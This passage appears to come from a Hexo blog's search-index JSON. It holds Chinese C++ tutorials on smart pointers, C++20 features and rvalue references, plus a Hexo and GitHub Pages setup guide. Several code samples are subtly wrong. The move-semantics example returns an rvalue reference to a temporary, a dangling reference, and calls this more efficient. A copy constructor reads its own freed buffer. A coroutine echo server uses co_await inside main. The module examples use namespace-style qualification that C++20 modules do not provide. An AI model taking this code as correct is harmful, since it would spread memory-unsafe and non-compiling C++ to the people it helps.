tomato; std::shared_ptr 支持 aliasing constructor。 Aliasing constructor，简单说就是构造出来的 shared_ptr 对象和参数 r 指向同一个控制块（会影响 r 指向的资源的生命周期），但是指向共享资源的指针是参数 ptr。看下面这个例子。 1234567891011using Vec = std::vector&lt;int&gt;;std::shared_ptr&lt;int&gt; GetSPtr() &#123; auto elts = &#123;0, 1, 2, 3, 4&#125;; std::shared_ptr&lt;Vec&gt; pvec = std::make_shared&lt;Vec&gt;(elts); return std::shared_ptr&lt;int&gt;(pvec, &amp;(*pvec)[2]);&#125;std::shared_ptr&lt;int&gt; sptr = GetSPtr();for (int i = -2; i &lt; 3; ++i) &#123; printf(&quot;%d\\n&quot;, sptr.get()[i]);&#125; 使用 std::shared_ptr 时，会涉及两次内存分配：一次分配共享资源对象；一次分配控制块。C++ 标准库提供了 std::make_shared 函数来创建一个 shared_ptr 对象，只需要一次内存分配。 这种情况下，不用通过控制块中的指针，我们也能知道共享资源的位置——这个指针也可以省略掉。 成员函数获取 this 的 shared_ptr 的正确的做法是继承 std::enable_shared_from_this。 123456789101112class Bar : public std::enable_shared_from_this&lt;Bar&gt; &#123; public: std::shared_ptr&lt;Bar&gt; GetSPtr() &#123; return shared_from_this(); &#125;&#125;;auto sptr1 = std::make_shared&lt;Bar&gt;();assert(sptr1.use_count() == 1);auto sptr2 = sptr1-&gt;GetSPtr();assert(sptr1.use_count() == 2);assert(sptr2.use_count() == 2); 一般情况下，继承了 std::enable_shared_from_this 的子类，成员变量中增加了一个指向 this 的 weak_ptr。这个 weak_ptr 在第一次创建 shared_ptr 的时候会被初始化，指向 this。 似乎继承了 std::enable_shared_from_this 的类都被强制必须通过 shared_ptr 进行管理。如果没有创建shared_ptr 直接调用shared_from_this()方法，将会报错。 std::weak_ptr&lt;T&gt; ：共享资源的观察者，需要和 std::shared_ptr 一起使用，不影响资源的生命周期。std::weak_ptr 要与 std::shared_ptr 一起使用。 一个 std::weak_ptr 对象看做是 std::shared_ptr 对象管理的资源的观察者，它不影响共享资源的生命周期： 如果需要使用 weak_ptr 正在观察的资源，可以将 weak_ptr 提升为 shared_ptr。 当 shared_ptr 管理的资源被释放时，weak_ptr 会自动变成 nullptr。 123456789101112131415void Observe(std::weak_ptr&lt;int&gt; wptr) &#123; if (auto sptr = wptr.lock()) &#123; std::cout &lt;&lt; &quot;value: &quot; &lt;&lt; *sptr &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;wptr lock fail&quot; &lt;&lt; std::endl; &#125;&#125;std::weak_ptr&lt;int&gt; wptr;&#123; auto sptr = std::make_shared&lt;int&gt;(111); wptr = sptr; Observe(wptr); // sptr 指向的资源没被释放，wptr 可以成功提升为 shared_ptr&#125;Observe(wptr); // sptr 指向的资源已被释放，wptr 无法提升为 shared_ptr 当 shared_ptr 析构并释放共享资源的时候，只要 weak_ptr 对象还存在，控制块就会保留，weak_ptr 可以通过控制块观察到对象是否存活。","categories":[{"name":"C++","slug":"C","permalink":"https://qianmuoy.github.io/categories/C/"}],"tags":[]},{"title":"c++20","slug":"c-20","date":"2023-03-22T12:35:37.000Z","updated":"2024-02-04T12:35:22.199Z","comments":true,"path":"2023/03/22/c-20/","link":"","permalink":"https://qianmuoy.github.io/2023/03/22/c-20/","excerpt":"","text":"语法糖语法糖是指计算机语言中添加的某种语法，这种语法对语言的功能并没有影响，但是更方便程序员使用。 C++也有很多语法糖，比如运算符重载、lambda表达式、auto类型推导等。这些语法糖可以让我们的代码更简洁、更易读、更高效。例如，下面两种写法是等价的： 12345678int sum = 0;for (int i = 0; i &lt; 10; i++) &#123; sum += i;&#125;int sum = 0;for (auto i : &#123;0,1,2,3,4,5,6,7,8,9&#125;) &#123; sum += i;&#125; c++11、20新特性大多数都是语法糖 c++20C++20有很多新的特性，其中最重要的四个是概念、范围、协程和模块。概念可以让我们定义泛型函数或类的约束条件，范围可以让我们更方便地操作容器和迭代器，协程可以让我们编写异步代码，模块可以让我们更高效地组织代码。除此之外，C++20还有一些其他的新特性，比如三向比较运算符、指定初始化、日历和时区功能等。 概念概念是一种用来约束模板类型的语法糖。我们可以用concept关键字来定义一个概念，然后用requires关键字来指定一个模板参数必须满足某个概念。例如，我们可以定义一个Integral概念，表示一个类型必须是整数类型 1234567template&lt;typename T&gt;concept Integral = std::is_integral_v&lt;T&gt;;// 然后我们可以用这个概念来约束一个函数模板的参数类型template&lt;Integral T&gt;T add(T a, T b) &#123; return a + b;&#125; 这样，如果我们传入非整数类型的参数，就会在编译时报错。 概念可以自定义，使用requires关键字 12345template&lt;typename T&gt;concept Sortable = requires(T a) &#123; &#123; std::sort(a.begin(), a.end()) &#125; -&gt; std::same_as&lt;void&gt;;&#125;;// 这个概念要求T类型有begin()和end()方法，并且可以用std::sort函数进行排序 标准库中提供了上百种常用的概念，放在和等头文件中。比较常用的一些有：std::same_as, std::derived_from, std::convertible_to, std::floating_point等 12345#include &lt;concepts&gt;template&lt;std::integral T&gt;T add(T a, T b) &#123; return a + b;&#125; 范围范围是C++20加入的一个重要的库功能，它提供了描述范围和对范围的操作的统一接口。一个范围是可以循环访问的任何东西，比如一个容器或者一个数组。我们可以用begin()和end()函数来获取一个范围的起始和终止位置。我们也可以用基于范围的for语句来遍历一个范围中的所有元素。例如，我们可以这样打印一个vector中的所有元素： 12345678#include &lt;iostream&gt;#include &lt;vector&gt;int main() &#123; std::vector&lt;int&gt; v = &#123;1, 2, 3, 4, 5&#125;; for (auto x : v) &#123; std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; &#125;&#125; 自定义的类型，满足range概念，都可以使用范围的特性。即它可以用begin()和end()函数来获取其起始和终止位置。这两个函数返回的对象必须是迭代器或者哨兵。迭代器是可以用++和*操作符来遍历元素的对象，哨兵是可以用&#x3D;&#x3D;操作符来判断是否到达范围的末尾的对象 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;ranges&gt;#include &lt;iostream&gt;class IntRange &#123;public: IntRange(int a, int b) : a_(a), b_(b) &#123;&#125; // 迭代器 class Iterator &#123; public: Iterator(int x) : x_(x) &#123;&#125; int operator*() const &#123; return x_; &#125; Iterator&amp; operator++() &#123; ++x_; return *this; &#125; bool operator==(const Iterator&amp; other) const &#123; return x_ == other.x_; &#125; bool operator!=(const Iterator&amp; other) const &#123; return !(*this == other); &#125; private: int x_; &#125;; // 哨兵 class Sentinel &#123; public: Sentinel(int y) : y_(y) &#123;&#125; bool operator==(const Iterator&amp; iter) const &#123; return *iter == y_; &#125; bool operator!=(const Iterator&amp; iter) const &#123; return !(*this == iter); &#125; private: int y_; &#125;; // begin()和end()函数 Iterator begin() const &#123; return Iterator(a_); &#125; Sentinel end() const &#123; return Sentinel(b_); &#125;private: int a_, b_;&#125;;int main() &#123; IntRange r(1,5); for (auto x : r) &#123; std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; &#125;&#125; 协程协程是一种可以在执行过程中被挂起和恢复的函数。它可以用来实现异步编程，提高性能和并发度。 C++20中引入了三个新的关键字，co_await，co_yield和co_return，用来标记一个函数是协程。这些关键字只是语法糖，编译器会将协程的上下文打包成一个对象，并让未执行完的协程先返回给调用者。要实现一个C++20协程，还需要提供两个鸭子类型，promise type和awaiter type，分别用来管理协程的生命周期和等待机制。 例如，我们可以实现一个简单的生成器协程，它每次产生一个整数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;coroutine&gt;#include &lt;iostream&gt;// promise typestruct Generator &#123; struct promise_type &#123; int current_value; std::suspend_always yield_value(int value) &#123; this-&gt;current_value = value; return &#123;&#125;; &#125; std::suspend_always initial_suspend() &#123; return &#123;&#125;; &#125; std::suspend_always final_suspend() noexcept &#123; return &#123;&#125;; &#125; Generator get_return_object() &#123; return Generator&#123;std::coroutine_handle&lt;promise_type&gt;::from_promise(*this)&#125;; &#125; void unhandled_exception() &#123;&#125; &#125;; // awaiter type bool move_next() &#123; p.resume(); return !p.done(); &#125; int current_value() &#123; return p.promise().current_value; &#125;private: std::coroutine_handle&lt;promise_type&gt; p;&#125;;// 协程函数Generator generator(int start = 0) &#123; int i = start; while (true) &#123; co_yield i++; &#125;&#125;int main() &#123; auto g = generator(1); for (int i = 0; i &lt; 10; ++i) &#123; g.move_next(); std::cout &lt;&lt; g.current_value() &lt;&lt; &quot; &quot;; &#125;&#125; 使用协程实现异步网络编程的主要优点是可以用同步的语法写出异步的代码，提高代码的可读性和可维护性1。要使用协程实现异步网络编程，需要以下几个步骤： 使用标准库中提供的std::jthread或std::thread创建一个或多个工作线程，用来执行协程任务。 使用标准库中提供的std::coroutine_handle或自定义的协程句柄类型，管理协程的生命周期和调度。 使用标准库中提供的std::future或自定义的awaiter类型，等待异步操作完成并获取结果。 使用标准库中提供的std::sync_wait或自定义的同步等待函数，等待所有协程任务完成后退出程序。 例如，我们可以使用一个简单的网络框架ZED3，它提供了一些基本的异步IO操作，并封装了协程句柄和awaiter类型。我们可以用以下代码实现一个简单的回显服务器： 12345678910111213141516171819202122232425262728293031323334353637#include &lt;zed/net.hpp&gt;#include &lt;iostream&gt;using namespace zed;int main() &#123; // 创建一个io_context对象 io_context ctx; // 创建一个工作线程 std::jthread th([&amp;ctx]() &#123; ctx.run(); &#125;); // 创建一个tcp服务器 tcp_server server(ctx); // 绑定端口 server.bind(8080); // 开始监听 server.listen(); while (true) &#123; try &#123; // 接受连接，并返回一个tcp_socket对象 auto socket = co_await server.accept(); std::cout &lt;&lt; &quot;New connection from &quot; &lt;&lt; socket.remote_endpoint() &lt;&lt; &quot;\\n&quot;; while (true) &#123; // 接收数据，并返回接收到的字节数 auto n = co_await socket.recv(); if (n == 0) break; // 连接断开 std::cout &lt;&lt; &quot;Received &quot; &lt;&lt; n &lt;&lt; &quot; bytes\\n&quot;; // 发送数据，并返回发送出去的字节数 auto m = co_await socket.send(n); std::cout &lt;&lt; &quot;Sent &quot; &lt;&lt; m &lt;&lt; &quot; bytes\\n&quot;; &#125; std::cout &lt;&lt; &quot;Connection closed\\n&quot;; &#125; catch (const std::exception&amp; e) &#123; std::cerr &lt;&lt; e.what() &lt;&lt; &quot;\\n&quot;; &#125; &#125;&#125; 模块C++20模块是一种新的代码组织和重用的方式，它可以替代传统的头文件和翻译单元。#include 多个头文件时编译很慢，使用 module 相当于直接调用编译好的二进制文件，这个二进制文件中描述了这个 module 导出的函数、类、模板等。模块可以提高编译速度，避免宏污染，隐藏实现细节，简化依赖关系等优点。要使用模块，需要以下几个步骤： 在源文件中使用module关键字声明一个模块，并指定模块名。 在源文件中使用export关键字导出需要对外提供的符号。 在其他源文件中使用import关键字导入需要使用的模块。 使用支持模块的编译器编译源文件，并生成相应的模块接口文件和目标文件。 例如，我们可以用以下代码定义一个名为hello的模块： 123456// hello.cppmmodule hello; // 声明一个名为hello的模块export void say_hello(); // 导出一个名为say_hello的函数void say_hello() &#123; std::cout &lt;&lt; &quot;Hello, world!\\n&quot;;&#125; 然后我们可以在另一个源文件中导入并使用这个模块： 12345// main.cppimport hello; // 导入hello模块int main() &#123; say_hello(); // 调用say_hello函数&#125; 子模块是一种在逻辑上划分模块的方法，它可以让用户选择性地导入模块的一部分或全部内容。子模块的命名规则中允许点存在于模块名字当中，但点并不代表语法上的从属关系，而只是帮助程序员理解模块间的逻辑关系。 例如，我们可以用以下代码定义一个名为hello.sub_a的子模块： 123456// hello.sub_a.cppmexport module hello.sub_a; // 声明一个名为hello.sub_a的子模块export void say_hello_sub_a(); // 导出一个名为say_hello_sub_a的函数void say_hello_sub_a() &#123; std::cout &lt;&lt; &quot;Hello, sub a!\\n&quot;;&#125; 然后我们可以在另一个源文件中定义一个名为hello.sub_b的子模块： 123456// hello.sub_b.cppmexport module hello.sub_b; // 声明一个名为hello.sub_b的子模块export void say_hello_sub_b(); // 导出一个名为say_hello_sub_b的函数void say_hello_sub_b() &#123; std::cout &lt;&lt; &quot;Hello, sub b!\\n&quot;;&#125; 最后我们可以在另一个源文件中定义一个名为hello的父模块，它导出了两个子模块： 1234// hello.cppmexport module hello; // 声明一个名为hello的父模块export import hello.sub_a; // 导出并导入hello.sub_a子模块export import hello.sub_b; // 导出并导入hello.sub_b子模块 这样，用户就可以根据需要导入不同的子模块或父模块： 123456// main.cppimport hello; // 导入hello父模块，相当于同时导入了两个子模块int main() &#123; say_hello_sub_a(); // 调用say_hello_sub_a函数 say_hello_sub_b(); // 调用say_hello_sub_b函数&#125; 命名空间冲突是指不同的模块或源文件中定义了相同的名称，导致编译器无法区分它们的含义。C++20 模块提供了一些方法来避免或解决命名空间冲突： 使用不同的模块名字来区分不同的模块，例如 hello.sub_a 和 hello.sub_b 就是两个不同的模块，即使它们都定义了 say_hello 函数，也不会发生冲突。 使用限定名字来指定模块中的名称，例如 hello.sub_a::say_hello 和 hello.sub_b::say_hello 就可以明确地区分两个模块中的函数。 使用 using 声明或 using 指令来引入需要的名称，但要注意避免引入重复或冲突的名称。例如: 1234567// main.cppimport hello; // 导入hello父模块using hello.sub_a::say_hello; // 引入hello.sub_a中的say_hello函数int main() &#123; say_hello(); // 调用hello.sub_a中的say_hello函数 hello.sub_b::say_hello(); // 调用hello.sub_b中的say_hello函数&#125; 使用 export 关键字来控制哪些名称被导出到其他模块或源文件，以减少暴露给外部的名称。例如： 123456789101112// math.cppmexport module math; // 声明一个名为math的模块namespace detail &#123; // 定义一个未导出的命名空间detail int add(int x, int y) &#123; return x + y; &#125; // 定义一个未导出的函数add&#125;export int sum(int x, int y) &#123; return detail::add(x, y); &#125; // 定义并导出一个函数sum，它调用了detail命名空间中的add函数// main.cppimport math; // 导入math模块int main() &#123; int s = math::sum(1, 2); // 调用math模块中导出的sum函数 int a = math::detail::add(1, 2); // 错误：math模块没有导出detail命名空间或add函数","categories":[{"name":"C++","slug":"C","permalink":"https://qianmuoy.github.io/categories/C/"}],"tags":[]},{"title":"引用","slug":"引用","date":"2023-03-22T11:39:05.000Z","updated":"2024-02-04T12:35:50.619Z","comments":true,"path":"2023/03/22/引用/","link":"","permalink":"https://qianmuoy.github.io/2023/03/22/%E5%BC%95%E7%94%A8/","excerpt":"","text":"指针与引用引用必须要初始化。 指针会根据编译器不同而变化，32位4字节，64位8字节 引用根据被引用的数据类型变化 int*&amp; 指针的引用 以指针来判断。 右值引用 c++11 左值：可以长时间保存，可以存在于&#x3D;左边的值，可以取地址； 右值：临时值，不能存在于&#x3D;左边的值，不可以取地址。 左值引用，实际上是取地址赋给新的变量。必须初始化。 常引用，用于引用部分右值，不可进行更改。实际上是使用一个临时变量与一块临时内存进行存储，必须初始化。可以引用左与右。 右值引用原理相近，临时内存的地址无法获取，但是可以对临时内存里面的内容进行修改。 12int&amp;&amp; v1 = 10;v1++; 右值引用是C++11新特性，之所以引入右值引用，是为了提高效率。如下面所示： 1234567891011121314151617181920212223242526272829303132333435363738394041class A&#123;public: A(size_t N):m_p(new char[N]) &#123; &#125; A(const A &amp; a) &#123; if (this != &amp;a) &#123; delete[]m_p; m_p = new char[strlen(m_p) + 1]; memcpy(m_p, a.m_p, strlen(m_p) + 1); &#125; &#125; ~A() &#123; delete []m_p; &#125; private: char *m_p = nullptr;&#125;; A createA(size_t N)&#123; return A(100);&#125; void func(A a)&#123; //&#125; int main()&#123; func(createA(100)); system(&quot;pause&quot;); return 0;&#125; 这里会导致大量得调用A得构造函数，不考虑编译优化，原本执行如下： 123456createA(100)，执行A(100)调用A(size_t)构造函数一次；退出createA，临时构造得A(100)，释放调用析构函数一次；赋给返回值会调用一次拷贝构造函数一次；返回值传入func中形参会调用拷贝构造函数一次；func运行完成后形参释放，调用A析构函数一次；返回值使用完成释放，调用A析构函数一次； 从上面可以看出有大量得构造、析构调用 ，但是我们做的工作无非就是临时构造一个A(100)给func使用而已。那么可否将临时A(100)始终一份给到func使用呢？答案就是右值引用。如下： 1234567891011121314151617181920212223242526272829303132class A&#123;public: A(size_t N):m_p(new char[N]) &#123; &#125; ~A() &#123; delete []m_p; &#125; private: char *m_p = nullptr;&#125;; A&amp;&amp; createA(size_t N)&#123; return (A&amp;&amp;)A(100);&#125; void func(A&amp;&amp; a)&#123; //&#125; int main()&#123; func(createA(100)); system(&quot;pause&quot;); return 0;&#125; 我们将临时A(100)强制转换为了右值引用，同时func形参也是右值引用，也就是将临时对象延长到了func中，中间避免了其他构造和析构调用，提高了效率。 ​ 注意到我们将A得拷贝构造函数去掉了，因为已经用不到。如果原版写法，去掉拷贝构造函数会崩溃，因为会自动调用默认拷贝构造函数，是浅拷贝，中间临时对象会提前删除公共内存，后面对象再次释放是就会重复删除内存导致崩溃。 这就是移动。它可以让你将一个对象的资源（如内存、文件句柄等）从一个临时的右值转移给另一个对象，而不需要进行深拷贝这样可以提高性能，避免不必要的内存分配和释放 std::move可以转换左值引用为右值引用。实现原理实际上就是强制转换 123456789int main()&#123; int a = 3; int &amp;&amp;t = std::move(a); int &amp;&amp;t2 = std::move(3); system(&quot;pause&quot;); return 0;&#125; 12345678910int main()&#123; int a = 3; int &amp;&amp;t = (int &amp;&amp;)a; t = 9; cout &lt;&lt; a &lt;&lt; endl; // a = 9 system(&quot;pause&quot;); return 0;&#125; std::unique_ptr不能相等，因为他们是不可以拷贝的，因此不可以左值赋给左值。使用移动，把左值转换成右值，就可以让二者相等。 通用引用通用引用就是根据接受值类型可以自行推导是左值引用还是右值引用。 如果声明变量或参数具有T&amp;&amp;某种推导类型的类型 T，则该变量或参数为通用引用，否则就是右值引用（无法传入左值）。 也就是传入的参数在编译时需要推导，如果不需要推导，则不是通用引用。如下： 123456789101112131415template&lt;typename T&gt;class B&#123;public: void print(T &amp;&amp;) &#123;&#125;&#125;; int main()&#123; B&lt;int&gt; b; b.print(3); // 为右值引用 system(&quot;pause&quot;); return 0;&#125; 因为在编译print之前print中的参数已经由B b确定了，所以在print编译时无需推导，故B中的T&amp;&amp;为右值引用。如果改为如下： 12345678910111213141516template&lt;typename T&gt;class B&#123;public: template&lt;typename Arg&gt; void print(Arg &amp;&amp;) &#123;&#125;&#125;; int main()&#123; B&lt;int&gt; b; b.print(3); // 为右值引用 system(&quot;pause&quot;); return 0;&#125; 因为print时函数模板形参和类模板形参类型时独立的，故在编译print时是需要推导的，故Arg&amp;&amp;为通用引用。 引用折叠引用虽然形式上是右值引用，但是却可以接受左值，这是怎么实现的呢？这就是引用折叠。 12345678910111213template&lt;typename T&gt;void print(T&amp;&amp; t) &#123;&#125; int main()&#123; int a = 9; print(a); print(9); system(&quot;pause&quot;); return 0;&#125; print(a)时，因为a为左值,会被推导成print(int&amp; &amp;&amp;t)形式，int&amp; &amp;&amp;t 会被折叠为int &amp;，所以最终形式为print(int &amp;)。（左值被推导为左值引用） print(9)时，为9为右值，所以被推导为print(int&amp;&amp; &amp;&amp;)形式，而int&amp;&amp; &amp;&amp;会被折叠为int&amp;&amp;，所以最终形式为print(int&amp;&amp;)。（右值被推导为右值引用） 引用类型只有两种，所以折叠形式就是4中，为：T&amp; &amp;,T&amp; &amp;&amp;,T&amp;&amp; &amp;,T&amp;&amp; &amp;&amp;。引用折叠规则概况为两种： T&amp;&amp; &amp;&amp;折叠为T&amp;&amp;; 其他折叠为T&amp;. 完美转发通用引用既可以接受左值也可以接受右值，但是通用引用本身是左值。如果在函数模板中继续传递该值给其他函数，势必会改变该值的属性，即都为左值引用。 使用std::forward(a)可以进行完美转发，使值属性和之前保持一致。某个功能对左值和右值处理情况不一致，如果将左值和右值引用当作同一种情况使用，可能会会有性能损失。例如左值进行深拷贝，右值进行移动。 原理是使用了引用折叠。具有推导类型的T&amp;&amp;转换会进行引用折叠。而int&amp;&amp;类型是确定的，不能进行折叠。 有两套，传入的为左或右，用右值进行强制类型转换，左右转化为左，右右转化为右","categories":[{"name":"C++","slug":"C","permalink":"https://qianmuoy.github.io/categories/C/"}],"tags":[]},{"title":"hexo快速入门","slug":"hexo快速入门","date":"2023-03-20T03:34:10.000Z","updated":"2024-02-04T11:55:16.709Z","comments":true,"path":"2023/03/20/hexo快速入门/","link":"","permalink":"https://qianmuoy.github.io/2023/03/20/hexo%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/","excerpt":"安装安装node.js安装git安装hexo","text":"安装安装node.js安装git安装hexo 新开一个文件夹，右键，在这里打开git bash 12npm install -g hexo-clinpm install --save hexo-deployer-git 配置github SSHssh可以免密的将本地的源码和资源上传到github，无需要每次都输账号和密码。 12cd ~ssh-keygen -t rsa -C &quot;邮件地址&quot; 在用户文件夹下生成了一个.ssh文件夹，进入，复制.pub文件中全部内容 打开github主页，点击个人设置，点击左侧的SSH and GPG keys，点击New SSH key 将id_rsa.pub复制的内容粘贴到key中，title随便起一个就行。 配置好用户名和邮箱 12git config --global user.name &quot;xxx&quot; #你的github用户名git config --global user.email &quot;xxx@163.com&quot; #填写你的github注册邮箱 写个人博客初始化12hexo initnpm install 新建一个博客1hexo n &lt;title&gt; 存放地址：source/_posts 解决图片问题_config.yml文件做如下修改：yaml post_asset_folder: true 创建同名文件夹，可以放入图片 使用的是Typora编辑器，可以在编辑器的文件&#x2F;偏好设置&#x2F;图像中进行如下设置： 复制到指定路径./$(filename)/ 安装图片显示插件 1npm install hexo-asset-image 生成本地静态网站并预览123hexo cleanhexo ghexo s 截断在文章中加入&lt;!--more--&gt;或在开头加入description: xxx 部署到github新建一个库，名字叫 username.github.io 将本地库与远端github仓库绑定123456git initgit add .git commit -m &quot;commit&quot;git remote add origin 仓库的http地址git pull --rebase origin maingit push [-u] origin main 编辑_config.yml1234deploy: type: git repository: 仓库的ssh地址 branch: main 在bash部署123hexo cleanhexo ghexo d 更改主题安装依赖1npm install --save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive 下载对应的主题1git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly 更改配置文件编辑_config.yml 1theme: butterfly 主题文档1https://butterfly.js.org/posts/21cfbf15/ 开启live2d安装依赖1npm install --save hexo-helper-live2d 下载model文件模型浏览live2d-widget-model-chitoselive2d-widget-model-epsilon2_1live2d-widget-model-gflive2d-widget-model-haru_01live2d-widget-model-haru_02live2d-widget-model-harutolive2d-widget-model-hibikilive2d-widget-model-hijikilive2d-widget-model-izumilive2d-widget-model-koharulive2d-widget-model-mikulive2d-widget-model-nicolive2d-widget-model-nietzschelive2d-widget-model-ni-jlive2d-widget-model-nipsilonlive2d-widget-model-nitolive2d-widget-model-shizukulive2d-widget-model-tororolive2d-widget-model-tsumikilive2d-widget-model-unitychanlive2d-widget-model-wankolive2d-widget-model-z16 1https://blog.csdn.net/wang_123_zy/article/details/87181892 模型下载1npm install live2d-widget-model-shizuku 配置配置Hexo的主_config.yml或者使用的主题的_config.yml 添加以下代码到配置文件中： 12345678910111213141516## Live2D看板娘live2d: enable: true pluginModelPath: assets/ model: #模板目录，在node_modules里 use: live2d-widget-model-shizuku display: position: right width: 300 height: 600 mobile: # 在手机端显示 show: false rect: opacity:0.7","categories":[{"name":"Basic","slug":"Basic","permalink":"https://qianmuoy.github.io/categories/Basic/"}],"tags":[]}],"categories":[{"name":"Windows Kernel","slug":"Windows-Kernel","permalink":"https://qianmuoy.github.io/categories/Windows-Kernel/"},{"name":"PWN","slug":"PWN","permalink":"https://qianmuoy.github.io/categories/PWN/"},{"name":"Windows Programming","slug":"Windows-Programming","permalink":"https://qianmuoy.github.io/categories/Windows-Programming/"},{"name":"Reverse","slug":"Reverse","permalink":"https://qianmuoy.github.io/categories/Reverse/"},{"name":"AI","slug":"AI","permalink":"https://qianmuoy.github.io/categories/AI/"},{"name":"Crypto","slug":"Crypto","permalink":"https://qianmuoy.github.io/categories/Crypto/"},{"name":"Algorithms","slug":"Algorithms","permalink":"https://qianmuoy.github.io/categories/Algorithms/"},{"name":"Python","slug":"Python","permalink":"https://qianmuoy.github.io/categories/Python/"},{"name":"Basic","slug":"Basic","permalink":"https://qianmuoy.github.io/categories/Basic/"},{"name":"MySQL","slug":"MySQL","permalink":"https://qianmuoy.github.io/categories/MySQL/"},{"name":"C++","slug":"C","permalink":"https://qianmuoy.github.io/categories/C/"}],"tags":[]}